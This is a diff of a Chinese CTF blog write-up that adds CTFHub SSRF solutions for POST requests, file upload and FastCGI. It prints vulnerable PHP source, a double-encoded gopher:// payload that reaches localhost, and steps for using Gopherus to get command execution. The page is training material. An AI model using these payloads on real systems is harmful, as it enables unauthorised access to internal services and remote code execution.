@@ -24,7 +24,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://10vexh.top/null">
 <meta property="article:published_time" content="2022-01-24T13:15:03.000Z">
-<meta property="article:modified_time" content="2022-01-24T15:20:26.301Z">
+<meta property="article:modified_time" content="2022-02-11T15:33:38.302Z">
 <meta property="article:author" content="10vexh">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://10vexh.top/null">
@@ -172,7 +172,7 @@
                     <i class="fa fa-edit"></i> 
                     
                     
-                        647
+                        ~5.39K
                     
                     字
                 </li>
@@ -181,11 +181,11 @@
         </header>
         <div class="kratos-post-content">
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
-                本文最后编辑于 <time datetime="1643037626301"></time> 前，其中的内容可能需要更新。
+                本文最后编辑于 <time datetime="1644593618302"></time> 前，其中的内容可能需要更新。
             </div>
             
                 <div class="kratos-post-inner-toc">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CTFHub-Web-SSRF"><span class="toc-number">1.</span> <span class="toc-text">CTFHub-Web-SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E8%AE%BF%E9%97%AE"><span class="toc-number">1.1.</span> <span class="toc-text">内网访问</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.</span> <span class="toc-text">伪协议读取文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.3.</span> <span class="toc-text">端口扫描</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CTFHub-Web-SSRF"><span class="toc-number">1.</span> <span class="toc-text">CTFHub-Web-SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E8%AE%BF%E9%97%AE"><span class="toc-number">1.1.</span> <span class="toc-text">内网访问</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.</span> <span class="toc-text">伪协议读取文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.3.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POST%E8%AF%B7%E6%B1%82"><span class="toc-number">1.4.</span> <span class="toc-text">POST请求</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="toc-number">1.5.</span> <span class="toc-text">上传文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastCGI%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.6.</span> <span class="toc-text">FastCGI协议</span></a></li></ol></li></ol>
                 </div>
             
             <hr />
@@ -205,6 +205,71 @@
 <p>直接开bp爆破。设置范围为8000到9000.</p>
 <p>我的在8405回显了flag。</p>
 <p><img src="/2022/01/24/CTFHub-Web-SSRF/%E7%88%86%E7%A0%B4%E7%AB%AF%E5%8F%A3.png" alt="爆破端口"></p>
+<h2 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h2><p>题目要求：这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年</p>
+<p>先尝试访问flag.php文件，发现存在一个输入框，查看源代码有提示。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Debug: key=cdad47ec427e5cdd1701734d1fea7378--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>输入key值后得到<code>Just View From 127.0.0.1</code>，说明我们只能从127.0.0.1访问。</p>
+<p>题目提示了我们用curl进行传输，我们先利用file来获取源代码</p>
+<p>index.php的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if (!isset($_REQUEST[&#x27;url&#x27;]))&#123;</span><br><span class="line">    header(&quot;Location: /?url=_&quot;);</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ch = curl_init();//初始curl会话</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_REQUEST[&#x27;url&#x27;]);//设置yrl及相应项</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span><br><span class="line">curl_exec($ch);// 抓取URL并把它传递给浏览器</span><br><span class="line">curl_close($ch);// 关闭cURL资源，并且释放系统资源</span><br></pre></td></tr></table></figure>
+
+<p>flag.php的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;) &#123;</span><br><span class="line">    echo &quot;Just View From 127.0.0.1&quot;;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$flag=getenv(&quot;CTFHUB&quot;);</span><br><span class="line">$key = md5($flag);</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&quot;key&quot;]) &amp;&amp; $_POST[&quot;key&quot;] == $key) &#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=&quot;/flag.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;key&quot;&gt;</span><br><span class="line">&lt;!-- Debug: key=&lt;?php echo $key;?&gt;--&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以尝试使用Gopher 协议来进行获取flag.</p>
+<p>Gopher协议可以支持发出GET，POST请求，可以截断get请求包和postd的请求包，在构成符合Gopher的请求，在SSRF中广泛的运用。但在各个编程语言版本中存在着限制。</p>
+<p><strong>Gopher协议格式</strong>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL:gopher:<span class="comment">//&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span></span><br></pre></td></tr></table></figure>
+
+<p>（注意这个_是可以任意加的）</p>
+<p>像这题目这里我们应当构造的就是<code>gropher://127.0.0.1:80/_</code>(后续的tcp数据流)</p>
+<p>我们要构造一个GET包或者一个POST包，然后进行url编码，实现请求。</p>
+<p>Gopher协议简单分成三步：</p>
+<blockquote>
+<p>1、构造HTTP数据包<br>2、URL编码、替换回车换行为%0d%0a<br>3、发送gopher协议</p>
+</blockquote>
+<p>其中在POST包中，必要的参数是host,Content-Type,Content-Length,还有题目的参数。我们在本题中可以构造一个POST包，发送HTTP POST请求。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /flag.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:80</span><br><span class="line">Content-Length: 36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">key=cdad47ec427e5cdd1701734d1fea7378</span><br></pre></td></tr></table></figure>
+
+<p>注意：length长度要对，key要对，gopher的数据要用<strong>两</strong>次的url编码后发送。在转换url编码中，第一次编码后形成的所有的<code>%0a</code>要换成<code>%0d%0a</code>。因为 Gopher协议包含的请求数据包中，可能包含有<code>=</code>、<code>&amp;</code>等特殊字符，避免与服务器解析传入的参数键值对混淆，所以对数据包进行 URL编码，这样服务端会把<code>%</code>后的字节当做普通字节。然后在进行第二次的编码</p>
+<p>根据这些要求再将这个请求进行编码处理.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?url=gopher://127.0.0.1:80/_POST /flag.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:80</span><br><span class="line">Content-Length: 36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">key=cdad47ec427e5cdd1701734d1fea7378</span><br></pre></td></tr></table></figure>
+
+<p>构成payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Length%253A%252036%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250A%250D%250Akey%3Dcdad47ec427e5cdd1701734d1fea7378</span><br></pre></td></tr></table></figure>
+
+<p>成功回显了flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Wed, 09 Feb 2022 16:33:10 GMT</span><br><span class="line">Server: Apache/2.4.25 (Debian)</span><br><span class="line">X-Powered-By: PHP/5.6.40</span><br><span class="line">Content-Length: 32</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">ctfhub&#123;96f70cc6a6437d5f1af03fe9&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h2><p>题目要求：这次需要上传一个文件到flag.php了.祝你好运</p>
+<p>这题属于上一题的拓展。</p>
+<p>一样先访问<code>?url=127.0.0.1/flag.php</code>，发现了一个上传的位置，只能选择文件，没有提交的表单页面。</p>
+<p><img src="/2022/01/24/CTFHub-Web-SSRF/%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B61.png" alt="上传文件1"></p>
+<p>于是我们可以自己利用F12在前端加一个提交的按键。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>提交成功后显示<strong>Just View From 127.0.0.1</strong>，就和上一题一样。</p>
+<p>由于只允许从本地访问，我们依然是要创建条件然后利用gopher来进行抓取flag。</p>
+<p>在burpsuite抓包中找到我们上传的记录，修改host为：<code>Host: 127.0.0.1:80</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST /flag.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:80</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://challenge-ba92298bc0c4c8a0.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------71864750719814341383319674580</span><br><span class="line">Content-Length: 352</span><br><span class="line">Origin: http://challenge-ba92298bc0c4c8a0.sandbox.ctfhub.com:10800</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------71864750719814341383319674580</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.txt&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">CTFHUB SSRF</span><br><span class="line">-----------------------------71864750719814341383319674580</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">æäº¤æ¥è¯¢</span><br><span class="line">-----------------------------71864750719814341383319674580--</span><br></pre></td></tr></table></figure>
+
+<p>进行url编码两次（第一次一样是要吧%0A改成%0D0A）</p>
+<p>然后构造</p>
+<p><code>?url=gopher://127.0.0.1:80/_(编码后的数据)</code>直接进行访问即可。</p>
+<h2 id="FastCGI协议"><a href="#FastCGI协议" class="headerlink" title="FastCGI协议"></a>FastCGI协议</h2><p>题目提示：这次.我们需要攻击一下fastcgi协议咯.也许附件的文章会对你有点帮助</p>
+<p><strong>快速通用网关接口</strong>（<strong>Fast</strong> <strong>C</strong>ommon <strong>G</strong>ateway <strong>I</strong>nterface／<strong>FastCGI</strong>）是一种让交互程序与Web服务器通信的协议。</p>
+<p>HTTP协议是浏览器和服务器中间件进行数据交换的协议，类比HTTP协议来说，fastcgi协议是服务器中间件和某个语言后端进行数据交换的协议。服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端。</p>
+<p>我们从题目附件可以拿到一个exp，我们也可以直接用这个exp来打。但是打比赛做题更推荐直接用一个现成的工具，相对来说方便一点。</p>
+<p>这个工具叫<a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">Gopherus</a>，可以生成一个现成的payload。</p>
+<p>下载完成后我们直接用语句<code>python gopherus.py --exploit fastcgi</code>打开。然后第一个输入框是让你输入一个你已知里面有的php文件名，这里空的话他也会有默认的没事。然后第二个输入是输入你要执行的命令，这里先用的<code>ls /</code></p>
+<p><img src="/2022/01/24/CTFHub-Web-SSRF/CTFHub-Web-SSRF%5CFastCGI%E5%8D%8F%E8%AE%AE1.png" alt="FastCGI协议1"></p>
+<p>然后将这个payload在进行一次url编码，进行运用<code>?url=(所得的编码后的payload)</code>得到flag文件位置</p>
+<p><img src="/2022/01/24/CTFHub-Web-SSRF/CTFHub-Web-SSRF%5CFastCGI%E5%8D%8F%E8%AE%AE2.png" alt="FastCGI协议2"></p>
+<p>接着同样方式执行<code>cat /flag_ad3ff7408a1c2dde89063abf589dd8d3</code></p>
+<p><img src="/2022/01/24/CTFHub-Web-SSRF/CTFHub-Web-SSRF%5CFastCGI%E5%8D%8F%E8%AE%AE3.png" alt="FastCGI协议3"></p>
+<p>同样进行编码后进行处理得到flag</p>
+<p><img src="/2022/01/24/CTFHub-Web-SSRF/Blog\source_posts\CTFHub-Web-SSRF\FastCGI协议4.png" alt="FastCGI协议4"></p>
 
         </div>
         
@@ -294,7 +359,7 @@
                     
                 </div>
                 <div class="pull-date">
-                <span>最后编辑：2022-01-24</span>
+                <span>最后编辑：2022-02-11</span>
                 </div>
             </div>
         </footer>
@@ -347,7 +412,7 @@
         <span class="toc-progress-bar"></span>
     </h4>
     <div class="textwidget">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CTFHub-Web-SSRF"><span class="toc-text">CTFHub-Web-SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E8%AE%BF%E9%97%AE"><span class="toc-text">内网访问</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-text">伪协议读取文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-text">端口扫描</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CTFHub-Web-SSRF"><span class="toc-text">CTFHub-Web-SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E8%AE%BF%E9%97%AE"><span class="toc-text">内网访问</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-text">伪协议读取文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POST%E8%AF%B7%E6%B1%82"><span class="toc-text">POST请求</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="toc-text">上传文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastCGI%E5%8D%8F%E8%AE%AE"><span class="toc-text">FastCGI协议</span></a></li></ol></li></ol>
     </div>
 </aside>
                 
